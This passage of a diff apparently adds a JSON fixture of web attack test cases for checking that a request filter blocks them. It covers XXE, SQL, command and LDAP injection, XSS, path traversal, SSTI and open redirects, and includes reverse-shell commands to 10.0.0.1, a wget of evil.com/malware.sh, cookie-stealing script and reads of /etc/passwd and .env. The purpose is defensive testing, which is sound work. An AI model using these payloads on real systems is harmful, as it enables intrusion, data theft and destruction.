+    "url": "/api/xml",
+    "headers": {
+      "content-type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+  },
+  {
+    "id": "ATK-XXE-102",
+    "category": "XXE",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/parse-xml",
+    "headers": {
+      "content-type": "application/xml"
+    },
+    "body": "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"https://evil.com/eval.dtd\"> %init; ]>"
+  },
+  {
+    "id": "ATK-XXE-103",
+    "category": "XXE",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/data",
+    "headers": {
+      "content-type": "text/xml"
+    },
+    "body": "<!ENTITY % dtd SYSTEM \"file:///c:/boot.ini\">"
+  },
+  {
+    "id": "ATK-XXE-104",
+    "category": "XXE",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/xml-import",
+    "headers": {
+      "content-type": "application/xml"
+    },
+    "body": "<!DOCTYPE r [ <!ELEMENT r ANY ><!ENTITY sp SYSTEM \"http://127.0.0.1:8080/secret\"> ]><r>&sp;</r>"
+  },
+  {
+    "id": "ATK-LDAP-105",
+    "category": "LDAP_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/ldap?user=*)(uid=*))(|(uid=*",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-LDAP-106",
+    "category": "LDAP_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/search?filter=(|(mail=*)(description=*))",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-LDAP-107",
+    "category": "LDAP_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/find?user=admin)(&)",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-LDAP-108",
+    "category": "LDAP_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/query?dept=Engineering)(|(objectclass=*)",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-OPEN-109",
+    "category": "OPEN_REDIRECT",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/auth/callback?redirect=http://evil-phishing.com/login",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-OPEN-110",
+    "category": "OPEN_REDIRECT",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/logout?return_url=https://attacker-domain.org",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-OPEN-111",
+    "category": "OPEN_REDIRECT",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/nav?next=https://malicious-site.io/download",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-OPEN-112",
+    "category": "OPEN_REDIRECT",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/goto?destination=http://fake-portal.com",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-HEAD-113",
+    "category": "HEADER_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/test",
+    "headers": {
+      "x-forwarded-for": "10.0.0.1%0d%0aSet-Cookie: admin=true"
+    }
+  },
+  {
+    "id": "ATK-HEAD-114",
+    "category": "HEADER_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/log",
+    "headers": {
+      "referer": "http://site.com\r\nX-Injected-Header: evil"
+    }
+  },
+  {
+    "id": "ATK-HEAD-115",
+    "category": "HEADER_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/track?url=test%0a%0dInjected:1",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-BASE-116",
+    "category": "BASE64_PAYLOAD",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/exec?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-BASE-117",
+    "category": "BASE64_PAYLOAD",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/payload?raw=JyBPUiAxPTE7LS0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-118",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/feedback?text=javascript:alert(1)&variation=119",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-119",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/view?name=<svg onload=alert('XSS')>&variation=120",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-120",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/items?v=121",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "desc": "<iframe src=javascript:document.cookie>"
+    }
+  },
+  {
+    "id": "ATK-VAR-121",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/render?html=<body onload=eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))>&variation=122",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-122",
+    "category": "XSS",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/post?v=123",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "content": "<div onclick=\"document.write('hacked')\">"
+    }
+  },
+  {
+    "id": "ATK-VAR-123",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/user?name=<input onfocus=alert(1) autofocus>&variation=124",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-124",
+    "category": "XSS",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/echo?s=document.cookie&variation=125",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-125",
+    "category": "XSS",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/tag?t=<script src='http://evil.com/xss.js'></script>&variation=126",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-126",
+    "category": "XSS",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/note?v=127",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "note": "test<script>fetch('/stolen?c='+document.cookie)</script>"
+    }
+  },
+  {
+    "id": "ATK-VAR-127",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/search?q=<a href='javascript:alert(1)'>click me</a>&variation=128",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-128",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/download?file=../../../../etc/passwd&variation=129",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-129",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/view?path=..%2F..%2F..%2Fwindows%2Fsystem32%2Fcmd.exe&variation=130",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-130",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/read?file=../../../etc/shadow&variation=131",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-131",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/load?doc=..\\..\\..\\boot.ini&variation=132",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-132",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/static?file=....//....//etc/passwd&variation=133",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-133",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/fetch?res=../../../../var/log/auth.log&variation=134",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-134",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/asset?img=../../../etc/hosts&variation=135",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-135",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/files/download?f=../../../../app/.env&variation=136",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-136",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/docs?p=..%2F..%2F..%2Fetc%2Fgroup&variation=137",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-137",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/export?path=../../../../usr/local/etc/config&variation=138",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-138",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/ping?host=127.0.0.1; cat /etc/passwd&variation=139",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-139",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/dns?domain=google.com && whoami&variation=140",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-140",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/test?cmd=127.0.0.1 | ls -la&variation=141",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-141",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/exec?v=142",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "command": "test `id`"
+    }
+  },
+  {
+    "id": "ATK-VAR-142",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/network?ip=127.0.0.1; wget http://evil.com/malware.sh&variation=143",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-143",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/status?host=localhost; uname -a&variation=144",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-144",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/run?v=145",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "script": "$(nc -e /bin/sh 10.0.0.1 4444)"
+    }
+  },
+  {
+    "id": "ATK-VAR-145",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/calc?expr=1; python -c 'import socket'&variation=146",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-146",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/service?name=app && id&variation=147",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-147",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/backup?dest=/tmp; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1&variation=148",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-148",
+    "category": "SSTI",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/render?template={{7*7}}&variation=149",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-149",
+    "category": "SSTI",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/greeting?name=${7*7}&variation=150",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-150",
+    "category": "SSTI",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/page?tpl={{config.items()}}&variation=151",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-151",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/search?q=' OR '1'='1&variation=152",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-152",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/users?id=1 UNION SELECT null, username, password FROM users--&variation=153",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-153",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/items?cat=tech'; DROP TABLE products;--&variation=154",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-154",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/login?v=155",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "username": "admin' --",
+      "password": "pwd"
+    }
+  },
+  {
+    "id": "ATK-VAR-155",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/login?v=156",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "username": "admin' OR 1=1 #",
+      "password": "pwd"
+    }
+  },
+  {
+    "id": "ATK-VAR-156",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/query?sort=name; EXEC xp_cmdshell('dir')&variation=157",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-157",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/filter?val=%27%20OR%201%3D1--&variation=158",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-158",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/check?code=' or 1=1&variation=159",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-159",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/orders?status=active' AND 1=1--&variation=160",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-160",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/data?v=161",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "filter": "1' or 'a'='a"
+    }
+  },
+  {
+    "id": "ATK-VAR-161",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/records?filter=test' union select 1,2,3--&variation=162",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-162",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/audit?q=1; INSERT INTO users VALUES ('hacker','pwd')&variation=163",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-163",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/audit?q=1; DELETE FROM logs WHERE 1=1&variation=164",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-164",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/audit?q=1; UPDATE users SET role='admin' WHERE id=5&variation=165",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-165",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/search?q=test%27%20and%201%3D1&variation=166",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-166",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/comments?msg=<script>alert('XSS')</script>&variation=167",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-167",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/profile?v=168",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "bio": "<img src=x onerror=alert(document.cookie)>"
+    }
+  },
+  {
+    "id": "ATK-VAR-168",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/feedback?text=javascript:alert(1)&variation=169",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-169",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/view?name=<svg onload=alert('XSS')>&variation=170",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-170",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/items?v=171",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "desc": "<iframe src=javascript:document.cookie>"
+    }
+  },
+  {
+    "id": "ATK-VAR-171",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/render?html=<body onload=eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))>&variation=172",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-172",
+    "category": "XSS",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/post?v=173",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "content": "<div onclick=\"document.write('hacked')\">"
+    }
+  },
+  {
+    "id": "ATK-VAR-173",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/user?name=<input onfocus=alert(1) autofocus>&variation=174",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-174",
+    "category": "XSS",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/echo?s=document.cookie&variation=175",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-175",
+    "category": "XSS",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/tag?t=<script src='http://evil.com/xss.js'></script>&variation=176",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-176",
+    "category": "XSS",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/note?v=177",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "note": "test<script>fetch('/stolen?c='+document.cookie)</script>"
+    }
+  },
+  {
+    "id": "ATK-VAR-177",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/search?q=<a href='javascript:alert(1)'>click me</a>&variation=178",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-178",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/download?file=../../../../etc/passwd&variation=179",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-179",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/view?path=..%2F..%2F..%2Fwindows%2Fsystem32%2Fcmd.exe&variation=180",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-180",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/read?file=../../../etc/shadow&variation=181",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-181",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/load?doc=..\\..\\..\\boot.ini&variation=182",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-182",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/static?file=....//....//etc/passwd&variation=183",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-183",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/fetch?res=../../../../var/log/auth.log&variation=184",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-184",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/asset?img=../../../etc/hosts&variation=185",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-185",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/files/download?f=../../../../app/.env&variation=186",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-186",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/docs?p=..%2F..%2F..%2Fetc%2Fgroup&variation=187",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-187",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/export?path=../../../../usr/local/etc/config&variation=188",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-188",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/ping?host=127.0.0.1; cat /etc/passwd&variation=189",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-189",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/dns?domain=google.com && whoami&variation=190",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-190",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/test?cmd=127.0.0.1 | ls -la&variation=191",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-191",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/exec?v=192",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "command": "test `id`"
+    }
+  },
+  {
+    "id": "ATK-VAR-192",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/network?ip=127.0.0.1; wget http://evil.com/malware.sh&variation=193",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-193",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/status?host=localhost; uname -a&variation=194",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-194",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/run?v=195",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "script": "$(nc -e /bin/sh 10.0.0.1 4444)"
+    }
+  },
+  {
+    "id": "ATK-VAR-195",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/calc?expr=1; python -c 'import socket'&variation=196",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-196",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/service?name=app && id&variation=197",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-197",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/backup?dest=/tmp; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1&variation=198",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-198",
+    "category": "SSTI",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/render?template={{7*7}}&variation=199",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
